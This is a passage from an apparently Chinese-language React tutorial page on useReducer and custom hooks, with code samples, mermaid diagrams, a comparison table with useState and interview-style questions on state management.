class="hljs-string">&#x27;light&#x27;</span>;<br>  &#125;<br>  <br>  <span class="hljs-keyword">return</span> context;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-4-useReducer-与复杂状态逻辑"><a href="#3-4-useReducer-与复杂状态逻辑" class="headerlink" title="3.4 useReducer 与复杂状态逻辑"></a>3.4 useReducer 与复杂状态逻辑</h2><h3 id="基础概念概述-7"><a href="#基础概念概述-7" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><p>useReducer 作用：管理复杂状态逻辑的 Hook，是 useState 的替代方案，借鉴 Redux 的核心思想</p><p>核心参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState, initFunc);<br></code></pre></td></tr></table></figure><ul><li>reducer：状态更新函数 (state, action) &#x3D;&gt; newState</li><li>initialState：初始状态</li><li>initFunc：惰性初始化函数（可选）</li></ul><p>三大要素:</p><ul><li>State：应用的状态数据</li><li>Action：描述状态变化的普通对象</li><li>Dispatch：触发状态更新的函数 dispatch(action)</li></ul><h3 id="核心机制深度解析-3"><a href="#核心机制深度解析-3" class="headerlink" title="核心机制深度解析"></a>核心机制深度解析</h3><p><strong>Reducer 函数工作原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 典型 reducer 结构</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;increment&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> + <span class="hljs-number">1</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;decrement&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">count</span>: state.<span class="hljs-property">count</span> - <span class="hljs-number">1</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;set_user&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">user</span>: action.<span class="hljs-property">payload</span> &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state; <span class="hljs-comment">// 必须返回默认状态</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>状态更新流程</strong></p><pre class="mermaid">sequenceDiagram  participant Component as 组件  participant Reducer as Reducer函数  participant React as React运行时    Component->>Reducer: dispatch({ type: 'increment' })  Reducer->>Reducer: 计算新状态 (state + 1)  Reducer->>React: 返回新状态  React->>Component: 触发重渲染</pre><p><strong>与 useState 对比</strong></p><table><thead><tr><th align="left">特性</th><th align="left">useReducer</th><th align="left">useState</th></tr></thead><tbody><tr><td align="left">适用场景</td><td align="left">复杂状态逻辑</td><td align="left">简单状态</td></tr><tr><td align="left">状态结构</td><td align="left">对象&#x2F;复杂结构</td><td align="left">任意类型</td></tr><tr><td align="left">更新逻辑</td><td align="left">集中管理（reducer）</td><td align="left">分散在组件中</td></tr><tr><td align="left">性能优化</td><td align="left">容易避免不必要更新</td><td align="left">需手动优化</td></tr><tr><td align="left">测试</td><td align="left">纯函数易于测试</td><td align="left">需渲染组件测试</td></tr></tbody></table><h3 id="高级应用模式-1"><a href="#高级应用模式-1" class="headerlink" title="高级应用模式"></a>高级应用模式</h3><p><strong>中间件模式（类似 Redux）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 增强 dispatch 函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useReducerWithMiddleware</span>(<span class="hljs-params">reducer, initialState</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(reducer, initialState);<br>  <br>  <span class="hljs-comment">// 支持中间件链</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">dispatchWithMiddleware</span> = action =&gt; &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Action:&#x27;</span>, action); <span class="hljs-comment">// 日志中间件</span><br>    <span class="hljs-title function_">dispatch</span>(action); <span class="hljs-comment">// 继续传递</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> [state, dispatchWithMiddleware];<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="复杂状态管理实战"><a href="#复杂状态管理实战" class="headerlink" title="复杂状态管理实战"></a>复杂状态管理实战</h3><p><strong>表单状态管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">formReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;change_field&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123;<br>        ...state,<br>        [action.<span class="hljs-property">field</span>]: action.<span class="hljs-property">value</span>,<br>        <span class="hljs-attr">touched</span>: &#123; ...state.<span class="hljs-property">touched</span>, [action.<span class="hljs-property">field</span>]: <span class="hljs-literal">true</span> &#125;<br>      &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;validate&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">errors</span>: <span class="hljs-title function_">validateForm</span>(state) &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;submit&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">isSubmitting</span>: <span class="hljs-literal">true</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;submit_success&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...initialState, <span class="hljs-attr">submitSuccess</span>: <span class="hljs-literal">true</span> &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Form</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(formReducer, initialState);<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = (<span class="hljs-params">e</span>) =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123;<br>      <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;change_field&#x27;</span>,<br>      <span class="hljs-attr">field</span>: e.<span class="hljs-property">target</span>.<span class="hljs-property">name</span>,<br>      <span class="hljs-attr">value</span>: e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span><br>    &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>异步操作管理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">asyncReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_START&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">loading</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">data</span>: action.<span class="hljs-property">payload</span>, <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span> &#125;;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;FETCH_FAILURE&#x27;</span>:<br>      <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>, <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>, <span class="hljs-attr">error</span>: action.<span class="hljs-property">error</span> &#125;;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params">&#123; userId &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(asyncReducer, &#123;<br>    <span class="hljs-attr">loading</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">data</span>: <span class="hljs-literal">null</span>,<br>    <span class="hljs-attr">error</span>: <span class="hljs-literal">null</span><br>  &#125;);<br><br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"></span>) =&gt; &#123;<br>      <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_START&#x27;</span> &#125;);<br>      <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUser</span>(userId);<br>        <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: data &#125;);<br>      &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;FETCH_FAILURE&#x27;</span>, error &#125;);<br>      &#125;<br>    &#125;;<br>    <br>    <span class="hljs-title function_">fetchUser</span>();<br>  &#125;, [userId]);<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>状态机模式（XState 思想）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">stateMachineReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (state.<span class="hljs-property">status</span>) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;idle&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;FETCH&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;loading&#x27;</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;loading&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;SUCCESS&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;success&#x27;</span>, <span class="hljs-attr">data</span>: action.<span class="hljs-property">data</span> &#125;;<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;FAILURE&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">error</span>: action.<span class="hljs-property">error</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;success&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;RESET&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;idle&#x27;</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;error&#x27;</span>:<br>      <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;RETRY&#x27;</span>) <span class="hljs-keyword">return</span> &#123; <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;loading&#x27;</span> &#125;;<br>      <span class="hljs-keyword">return</span> state;<br>    <span class="hljs-attr">default</span>:<br>      <span class="hljs-keyword">return</span> state;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高频面试题与破解方案-9"><a href="#高频面试题与破解方案-9" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：何时该用 useReducer 而不是 useState？</strong></p><p>决策树：</p><pre class="mermaid">graph TD  A[状态结构复杂?] -->|是| B[useReducer]  A -->|否| C{状态更新逻辑复杂?}  C -->|是| B  C -->|否| D[useState]  E[需要跨组件更新?] -->|是| B  F[需要可预测状态?] -->|是| B</pre><p><strong>Q：如何避免 reducer 函数过大？</strong></p><p>优化策略：</p><ul><li>拆分 reducer：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">rootReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">user</span>: <span class="hljs-title function_">userReducer</span>(state.<span class="hljs-property">user</span>, action),<br>    <span class="hljs-attr">posts</span>: <span class="hljs-title function_">postsReducer</span>(state.<span class="hljs-property">posts</span>, action)<br>  &#125;;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>组合 action 创建函数：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> actions = &#123;<br>  <span class="hljs-attr">increment</span>: <span class="hljs-function">() =&gt;</span> (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;increment&#x27;</span> &#125;),<br>  <span class="hljs-attr">addTodo</span>: <span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;add_todo&#x27;</span>, <span class="hljs-attr">payload</span>: text &#125;)<br>&#125;;<br><span class="hljs-comment">// 使用：dispatch(actions.increment())</span><br></code></pre></td></tr></table></figure><p><strong>Q：useReducer 如何实现时间旅行调试？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 1. 添加历史记录</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">reducerWithHistory</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">const</span> nextState = <span class="hljs-title function_">reducer</span>(state.<span class="hljs-property">current</span>, action);<br>  <span class="hljs-keyword">return</span> &#123;<br>    <span class="hljs-attr">current</span>: nextState,<br>    <span class="hljs-attr">history</span>: [...state.<span class="hljs-property">history</span>, &#123; action, <span class="hljs-attr">state</span>: nextState &#125;]<br>  &#125;;<br>&#125;<br><br><span class="hljs-comment">// 2. 实现撤销/重做</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">undoableReducer</span>(<span class="hljs-params">state, action</span>) &#123;<br>  <span class="hljs-keyword">if</span> (action.<span class="hljs-property">type</span> === <span class="hljs-string">&#x27;UNDO&#x27;</span>) &#123;<br>    <span class="hljs-keyword">return</span> &#123; ...state, <span class="hljs-attr">current</span>: state.<span class="hljs-property">history</span>[state.<span class="hljs-property">history</span>.<span class="hljs-property">length</span> - <span class="hljs-number">2</span>] &#125;;<br>  &#125;<br>  <span class="hljs-comment">// ...其他action处理</span><br>&#125;<br><br><span class="hljs-comment">// 使用</span><br><span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(undoableReducer, &#123;<br>  <span class="hljs-attr">current</span>: initialState,<br>  <span class="hljs-attr">history</span>: [initialState]<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="与-Context-集成"><a href="#与-Context-集成" class="headerlink" title="与 Context 集成"></a>与 Context 集成</h3><p><strong>全局状态管理方案</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 创建 Context</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">StateContext</span> = <span class="hljs-title function_">createContext</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">DispatchContext</span> = <span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-comment">// 全局 Provider</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AppProvider</span>(<span class="hljs-params">&#123; children &#125;</span>) &#123;<br>  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(rootReducer, initialState);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">StateContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;state&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">DispatchContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;dispatch&#125;</span>&gt;</span></span><br><span class="language-xml">        &#123;children&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">DispatchContext.Provider</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">StateContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 自定义 Hook 访问</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useAppState</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">StateContext</span>);<br>  <span class="hljs-keyword">if</span> (!state) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;必须在 AppProvider 内使用&#x27;</span>);<br>  <span class="hljs-keyword">return</span> state;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useAppDispatch</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">DispatchContext</span>);<br>  <span class="hljs-keyword">if</span> (!dispatch) <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;必须在 AppProvider 内使用&#x27;</span>);<br>  <span class="hljs-keyword">return</span> dispatch;<br>&#125;<br><br><span class="hljs-comment">// 组件中使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Counter</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> state = <span class="hljs-title function_">useAppState</span>();<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useAppDispatch</span>();<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> dispatch(&#123; type: &#x27;increment&#x27; &#125;)&#125;&gt;</span><br><span class="language-xml">      &#123;state.count&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="最佳实践总结"><a href="#最佳实践总结" class="headerlink" title="最佳实践总结"></a>最佳实践总结</h3><ol><li>纯函数原则：Reducer 必须是纯函数，不产生副作用</li><li>不可变更新：始终返回新状态对象，不修改原状态</li><li>类型安全：使用 TypeScript 强化 action 类型</li></ol><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tsx"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Action</span> = <br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;increment&#x27;</span> &#125;<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;decrement&#x27;</span> &#125;<br>  | &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;set_count&#x27;</span>; <span class="hljs-attr">payload</span>: <span class="hljs-built_in">number</span> &#125;;<br></code></pre></td></tr></table></figure><ol start="4"><li>逻辑复用：提取 reducer 到独立文件便于测试</li><li>合理拆分：大型应用按功能域拆分多个 reducer</li><li>避免过度：简单状态仍使用 useState</li></ol><h3 id="使用场景决策逻辑"><a href="#使用场景决策逻辑" class="headerlink" title="使用场景决策逻辑"></a>使用场景决策逻辑</h3><pre class="mermaid">graph TD  A[状态管理需求] --> B{状态结构}  B -->|简单值| C[useState]  B -->|复杂对象| D{更新逻辑}  D -->|简单| C  D -->|复杂| E[useReducer]  A --> F{状态共享范围}  F -->|组件内| G[useState/useReducer]  F -->|跨组件| H[Context + useReducer]  A --> I{需要时间旅行/撤销}  I -->|是| E</pre><h2 id="3-5-自定义-Hooks（封装可复用逻辑）"><a href="#3-5-自定义-Hooks（封装可复用逻辑）" class="headerlink" title="3.5 自定义 Hooks（封装可复用逻辑）"></a>3.5 自定义 Hooks（封装可复用逻辑）</h2><h3 id="基础概念概述-8"><a href="#基础概念概述-8" class="headerlink" title="基础概念概述"></a>基础概念概述</h3><p>自定义 Hook 是什么：将组件逻辑提取到可重用的 JavaScript 函数中的技术，是 React 逻辑复用的终极解决方案</p><p>核心特征：</p><ul><li>名称以 use 开头（如 useFetch）</li><li>可以调用其他 Hook（如 useState, useEffect）</li><li>不包含 UI 渲染，只包含状态逻辑</li></ul><p>与普通函数的区别：</p><table><thead><tr><th align="left">特性</th><th align="left">自定义 Hook</th><th align="left">工具函数</th></tr></thead><tbody><tr><td align="left">可调用其他 Hook</td><td align="left">✅</td><td align="left">❌</td></tr><tr><td align="left">状态隔离</td><td align="left">每次调用独立状态</td><td align="left">无状态&#x2F;静态</td></tr><tr><td align="left">使用场景</td><td align="left">组件逻辑复用</td><td align="left">数据处理&#x2F;工具类</td></tr></tbody></table><h3 id="核心机制深度解析-4"><a href="#核心机制深度解析-4" class="headerlink" title="核心机制深度解析"></a>核心机制深度解析</h3><p><strong>状态隔离原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 自定义 Hook</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">useCounter</span>(<span class="hljs-params">initialValue = <span class="hljs-number">0</span></span>) &#123;<br>  <span class="hljs-keyword">const</span> [count, setCount] = <span class="hljs-title function_">useState</span>(initialValue);<br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; <span class="hljs-title function_">setCount</span>(<span class="hljs-function"><span class="hljs-params">c</span> =&gt;</span> c + <span class="hljs-number">1</span>);<br>  <span class="hljs-keyword">return</span> [count, increment];<br>&#125;<br><br><span class="hljs-comment">// 组件A使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentA</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [countA, incA] = <span class="hljs-title function_">useCounter</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 独立状态</span><br>&#125;<br><br><span class="hljs-comment">// 组件B使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ComponentB</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [countB, incB] = <span class="hljs-title function_">useCounter</span>(<span class="hljs-number">10</span>); <span class="hljs-comment">// 独立状态</span><br>&#125;<br></code></pre></td></tr></table></figure><p>关键原理：每次调用自定义 Hook 都会创建独立的状态副本（闭包机制）</p><p><strong>Hook 调用规则</strong></p><pre class="mermaid">graph LR  A[函数组件] --> B[调用自定义Hook]  B --> C[内部调用React Hook]  C --> D[返回状态和逻辑]  D --> A</pre><p>强制规则：</p><ul><li>只在 React 函数组件或自定义 Hook 中调用</li><li>只在顶层调用（不能在条件&#x2F;循环中使用）</li><li>命名必须以 use 开头</li></ul><h3 id="设计模式与最佳实践"><a href="#设计模式与最佳实践" class="headerlink" title="设计模式与最佳实践"></a>设计模式与最佳实践</h3><p><strong>参数传递与返回值</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 